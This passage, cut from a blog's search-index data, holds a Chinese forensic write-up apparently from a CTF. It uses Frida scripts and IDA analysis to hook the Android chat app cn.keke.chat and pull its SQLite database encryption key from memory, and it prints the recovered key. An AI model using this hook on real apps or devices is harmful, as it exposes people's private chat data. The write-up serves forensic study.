print(&#x27;spawn_added:&#x27;, spawn) event.set()def on_message(spawn, message, data): print(&#x27;on_message:&#x27;, spawn, message, data) def on_message(message, data): if message[&#x27;type&#x27;] == &#x27;send&#x27;: print(&quot;[*] &#123;0&#125;&quot;.format(message[&#x27;payload&#x27;])) else: print(message)device.on(&#x27;spawn-added&#x27;, spawn_added)device.on(&#x27;spawn-removed&#x27;, spawn_removed)device.on(&#x27;child-added&#x27;, on_spawned)device.on(&#x27;child-removed&#x27;, on_spawned)device.on(&#x27;process-crashed&#x27;, on_spawned)device.on(&#x27;output&#x27;, on_spawned)device.on(&#x27;uninjected&#x27;, on_spawned)device.on(&#x27;lost&#x27;, on_spawned)device.enable_spawn_gating()event = threading.Event()print(&#x27;Enabled spawn gating&#x27;)pid = device.spawn([&quot;cn.keke.chat&quot;])#pid = device.spawn([&quot;cn.keke.chat&quot;])session = device.attach(pid)print(&quot;[*] Attach Application id:&quot;,pid)device.resume(pid)# print(&quot;[*] Application onResume&quot;)# script = session.create_script(jscode)# script.on(&#x27;message&#x27;, on_message)# print(&#x27;[*] Running CTF&#x27;)# script.load()sys.stdin.read() 这个脚本是python的 所以我们得在python.exe路径下运行 并且我们还需要安装frida-tools库 1pip install firda-toolspython hook_thread_open_file.py 1Enabled spawn gating[*] Attach Application id: 2324spawn_added: Spawn(pid=2351, identifier=&quot;cn.keke.chat:marsservice&quot;)spawn_added: Spawn(pid=2377, identifier=&quot;cn.keke.chat:pushservice&quot;)[*] 操作文件: 0xc3bdb690[*] 路径:/data/app/cn.keke.chat-1/base.apk[*] 加载文件: libandroidfw.so[*] 操作文件: 0xc3bdb690[*] 路径:/data/app/cn.keke.chat-1/base.apk[*] 加载文件: libandroidfw.so[*] 路径:/data/app/cn.keke.chat-1/lib/x86/libstlport_shared.so[*] 加载文件: libjavacore.so[*] 路径:/data/app/cn.keke.chat-1/base.apk[*] 加载文件: libopenjdkjvm.so[*] 路径:/data/app/cn.keke.chat-1/lib/x86/libmarsxlog.so[*] 加载文件: libjavacore.so[*] 路径:/data/app/cn.keke.chat-1/lib/x86/libmarsstn.so[*] 加载文件: libjavacore.so[*] 路径:/data/app/cn.keke.chat-1/lib/x86/libstlport_shared.so[*] 加载文件: libjavacore.so[*] 路径:/data/app/cn.keke.chat-1/lib/x86/libmarsxlog.so[*] 加载文件: libjavacore.so[*] 路径:/data/app/cn.keke.chat-1/lib/x86/libmarsstn.so[*] 加载文件: libjavacore.so[*] 路径:/data/user/0/cn.keke.chat/files/mipush_region.lock[*] 加载文件: libjavacore.so[*] 路径:/data/user/0/cn.keke.chat/files/mipush_region[*] 加载文件: libopenjdkjvm.so[*] 路径:/data/user/0/cn.keke.chat/shared_prefs/mipush_extra.xml[*] 加载文件: libopenjdkjvm.so[*] 路径:/data/user/0/cn.keke.chat/files/BLBwBwMM/host/ipportrecords2.xml[*] 加载文件: libc.so[*] 路径:/data/user/0/cn.keke.chat/files/BLBwBwMM/Heartbeat.ini[*] 加载文件: libc.so[*] 路径:/data/user/0/cn.keke.chat/databases/geofencing.db[*] 加载文件: libsqlite.so[*] 路径:/data/user/0/cn.keke.chat/shared_prefs/sp_client_report_status.xml[*] 加载文件: libopenjdkjvm.so[*] 路径:/data/user/0/cn.keke.chat/databases/geofencing.db-journal[*] 加载文件: libsqlite.so[*] 路径:/data/user/0/cn.keke.chat/databases/geofencing.db-journal[*] 加载文件: libsqlite.so[*] 路径:/data/user/0/cn.keke.chat/databases/geofencing.db-journal[*] 加载文件: libsqlite.so[*] 路径:/data/user/0/cn.keke.chat/databases/geofencing.db-journal[*] 加载文件: libsqlite.so[*] 路径:/data/user/0/cn.keke.chat/databases/geofencing.db-journal[*] 加载文件: libsqlite.so[*] 路径:/data/user/0/cn.keke.chat/shared_prefs/mipush_extra.xml[*] 加载文件: libopenjdkjvm.so[*] 路径:/data/user/0/cn.keke.chat/shared_prefs/cn.keke.chat_preferences.xml[*] 加载文件: libopenjdkjvm.so[*] 路径:/data/user/0/cn.keke.chat/files/BLBwBwMM/169c2404d30b18c81620889828374/data[*] 加载文件: libmarsstn.so[*] 路径:/data/misc/keychain/pubkey_blacklist.txt[*] 加载文件: libjavacore.so[*] 路径:/data/misc/keychain/serial_blacklist.txt[*] 加载文件: libjavacore.so[*] 路径:/data/misc/keychain/pins[*] 加载文件: libjavacore.so 1[*] 路径:/data/user/0/cn.keke.chat/files/BLBwBwMM/169c2404d30b18c81620889828374/data[*] 加载文件: libmarsstn.so 经确认 这个data就是被加密的数据库了 但是我们要怎么获取私钥key呢 我们进IDA分析一下这个apk是怎么读取数据库的 我们要注意 是这个libmarsstn.so文件读取的数据库文件 我们分析的时候就先分析这个文件 不过注意是x86的 不清楚就都看一下 我们字符串搜索 查看sqlite 发现他是sqlite3的数据库 然后我们找到了一个很有价值的字符串:SQLite format 3 1.rodata:0032363E aSqliteFormat3 db &#x27;SQLite format 3&#x27;,0 ; DATA XREF: sub_23E940+158↑o 更重要的是后面的函数 sub_23E940 我们跟进 查看伪代码 这里就需要思考了 就算这个函数就是加密的函数 那么我们要怎么解密 如果直接硬刚肯定是不现实的 咱没这个实力 1https://www.cnblogs.com/qxxnxxFight/p/4096074.html 这个大佬的博客里面写着一些SQL加密的 可以说是源码 12345678910111213141 void sqlite3pager_free_codecarg(void *pArg);2 int sqlite3_key_interop(sqlite3 *db, const void *pKey, int nKeySize);3 int sqlite3_rekey_interop(sqlite3 *db, const void *pKey, int nKeySize);4 int sqlite3CodecAttach(sqlite3 *db, int nDb, const void *pKey, int nKeyLen);5 int sqlite3_rekey(sqlite3 *db, const void *pKey, int nKey);6 int sqlite3_key(sqlite3 *db, const void *pKey, int nKey);7 void sqlite3pager_set_codec(Pager *pPager,void *(*xCodec)(void*,void*,Pgno,int),void *pCodec);8 static LPCryptBlock CreateCryptBlock(unsigned char* hKey, Pager *pager, LPCryptBlock pExisting);9 static unsigned char * DeriveKey(const void *pKey, int nKeyLen);10 static void * sqlite3pager_get_codecarg(Pager *pPager);11 static void DestroyCryptBlock(LPCryptBlock pBlock);12 void * sqlite3Codec(void *pArg, unsigned char **data_addr, Pgno nPageNum, int nMode);13 void sqlite3_activate_see(const char* right );14 void sqlite3CodecGetKey(sqlite3* db, int nDB, void** Key, int* nKey); 列出的总共是14种 我们看看IDA里面的加密函数 1char *__cdecl sub_23E940(_DWORD *a1, char *a2, int a3, int a4) cdecl 有点像第12个 毕竟你要看他传入的是4个参数 这个可能只是个子函数 我们看看谁调用的他 看看调用它的是调用了几个参数 跟进sub_23E940 看看谁调用的他 1int __usercall sub_20F0E0@&lt;eax&gt;(int a1@&lt;eax&gt;, int a2@&lt;edx&gt;, int a3, int a4) 还是4个的 而且你看名字也有点像12 暂定是他吧 然后我们看第12个 对应的第三个参数就是我们需要的私钥 而这个私钥在调用时会被存放在内存里 上脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273# -*- coding: utf-8 -*-import codecsimport fridaimport sysimport threading#device = frida.get_remote_device()device = frida.get_device_manager().enumerate_devices()[-1]#print(device)pending = []sessions = []scripts = []event = threading.Event()jscode = &quot;&quot;&quot;Java.perform(function () &#123; var Mars = Java.use(&quot;com.tencent.mars.Mars&quot;); Mars.onCreate.implementation = function(args) &#123; var base = Process.findModuleByName(&quot;libmarsstn.so&quot;).base; Interceptor.attach(base.add(0x20F0E0+1), &#123; onEnter: function(sql_args) &#123; send(&quot;key:&quot; + Memory.readUtf8String(sql_args[1])); &#125; &#125;); &#125;&#125;);&quot;&quot;&quot;def on_spawned(spawn): print(&#x27;on_spawned:&#x27;, spawn) pending.append(spawn) event.set()def spawn_added(spawn): print(&#x27;spawn_added:&#x27;, spawn) event.set() if(spawn.identifier.startswith(&#x27;cn.keke.chat&#x27;)): # if(spawn.identifier.startswith(&#x27;cn.keke.chat&#x27;)): session = device.attach(spawn.pid) script = session.create_script(jscode) script.on(&#x27;message&#x27;, on_message) script.load() device.resume(spawn.pid) def spawn_removed(spawn): print(&#x27;spawn_added:&#x27;, spawn) event.set()def on_message(spawn, message, data): print(&#x27;on_message:&#x27;, spawn, message, data) def on_message(message, data): if message[&#x27;type&#x27;] == &#x27;send&#x27;: print(&quot;[*] &#123;0&#125;&quot;.format(message[&#x27;payload&#x27;])) else: print(message)device.on(&#x27;spawn-added&#x27;, spawn_added)device.on(&#x27;spawn-removed&#x27;, spawn_removed)device.on(&#x27;child-added&#x27;, on_spawned)device.on(&#x27;child-removed&#x27;, on_spawned)device.on(&#x27;process-crashed&#x27;, on_spawned)device.on(&#x27;output&#x27;, on_spawned)device.on(&#x27;uninjected&#x27;, on_spawned)device.on(&#x27;lost&#x27;, on_spawned)device.enable_spawn_gating()event = threading.Event()print(&#x27;Enabled spawn gating&#x27;)pid = device.spawn([&quot;cn.keke.chat&quot;])#pid = device.spawn([&quot;cn.keke.chat&quot;])session = device.attach(pid)print(&quot;[*] Attach Application id:&quot;,pid)device.resume(pid)# print(&quot;[*] Application onResume&quot;)# script = session.create_script(jscode)# script.on(&#x27;message&#x27;, on_message)# print(&#x27;[*] Running CTF&#x27;)# script.load()sys.stdin.read() 相比上一个改的不多 就是改了一下jscode 注意 我们的地址都是偏移地址 base.apk的基地址+函数的地址&#x3D;偏移地址 只不过还有一个要注意的地方 根据数据库密钥附加的源码分析 判断左数第三个变量即为私钥 又因为传参的顺序从右向左 则有如下对应关系 为args[0]:nKeyLen, args[1]:pKey; args[2]:nDb; args[3] *db 所以args[1]为私钥pKey 咱hook一下 1Enabled spawn gating[*] Attach Application id: 2150spawn_added: Spawn(pid=2178, identifier=&quot;cn.keke.chat:marsservice&quot;)spawn_added: Spawn(pid=2204, identifier=&quot;cn.keke.chat:pushservice&quot;)[*] key:216bf0c8-75a3-4bc4-841e-87cabf6bac9aspawn_added: Spawn(pid=2270, identifier=&quot;cn.keke.chat:marsservice&quot;)[*] key:216bf0c8-75a3-4bc4-841e-87cabf6bac9aspawn_added: Spawn(pid=2319, identifier=&quot;cn.keke.chat:marsservice&quot;)[*] key:216bf0c8-75a3-4bc4-841e-87cabf6bac9aspawn_added: Spawn(pid=2359, identifier=&quot;cn.keke.chat:marsservice&quot;)[*] key:216bf0c8-75a3-4bc4-841e-87cabf6bac9aspawn_added: Spawn(pid=2401, identifier=&quot;cn.keke.chat:marsservice&quot;)[*] key:216bf0c8-75a3-4bc4-841e-87cabf6bac9aspawn_added: Spawn(pid=2441, identifier=&quot;cn.keke.chat:marsservice&quot;)[*] key:216bf0c8-75a3-4bc4-841e-87cabf6bac9a Jackpot! 然后就可以解密数据库了","categories":[{"name":"Forensic","slug":"Forensic","permalink":"https://dawoxiansigema.github.io/categories/Forensic/"}],"tags":[]}],"categories":[{"name":"Fomatstring","slug":"Fomatstring","permalink":"https://dawoxiansigema.github.io/categories/Fomatstring/"},{"name":"Stack/Advanced","slug":"Stack-Advanced","permalink":"https://dawoxiansigema.github.io/categories/Stack-Advanced/"},{"name":"Stack/Medium","slug":"Stack-Medium","permalink":"https://dawoxiansigema.github.io/categories/Stack-Medium/"},{"name":"Stack/Basic","slug":"Stack-Basic","permalink":"https://dawoxiansigema.github.io/categories/Stack-Basic/"},{"name":"Forensic","slug":"Forensic","permalink":"https://dawoxiansigema.github.io/categories/Forensic/"}],"tags":[]}